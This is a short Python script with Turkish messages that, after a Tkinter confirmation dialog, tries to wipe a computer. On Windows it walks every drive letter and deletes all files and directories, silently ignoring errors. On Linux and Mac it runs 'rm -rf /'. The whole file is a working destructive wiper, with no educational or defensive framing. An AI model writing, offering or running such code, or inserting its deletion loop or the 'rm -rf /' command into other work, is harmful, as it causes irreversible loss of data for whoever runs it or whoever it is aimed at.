import os
import shutil
import platform
import ctypes
import tkinter as tk
from tkinter import messagebox

def confirm_deletion():
    root = tk.Tk()
    root.withdraw()  # Ana pencereyi gizle
    
    result = messagebox.askyesno(
        "UYARI", 
        "Bu işlem bilgisayınızdaki TÜM dosyaları geri döndürülemez şekilde silecektir.\n\n"
        "Devam etmek istediğinizden emin misiniz?\n\n"
        "Evet = Tüm dosyaları sil\n"
        "Hayır = Programı kapat",
        icon='warning'
    )
    
    root.destroy()
    return result

def delete_all_files():
    try:
        # Windows'ta yönetici yetkisi kontrolü
        if platform.system() == 'Windows':
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("Yönetici yetkisi gerekli!")
                return
        
        # Sistem diskini al (genellikle C:)
        if platform.system() == 'Windows':
            drives = ['%s:\\' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
            for drive in drives:
                try:
                    for root, dirs, files in os.walk(drive):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                os.remove(file_path)
                            except:
                                pass
                        for dir in dirs:
                            try:
                                dir_path = os.path.join(root, dir)
                                shutil.rmtree(dir_path)
                            except:
                                pass
                except:
                    pass
        else:
            # Linux/Mac için
            os.system("rm -rf /")
            
    except Exception as e:
        print(f"Hata: {e}")

if __name__ == "__main__":
    if confirm_deletion():
        delete_all_files()
        print("Tüm dosyalar silindi.")
    else:
        print("İptal edildi.")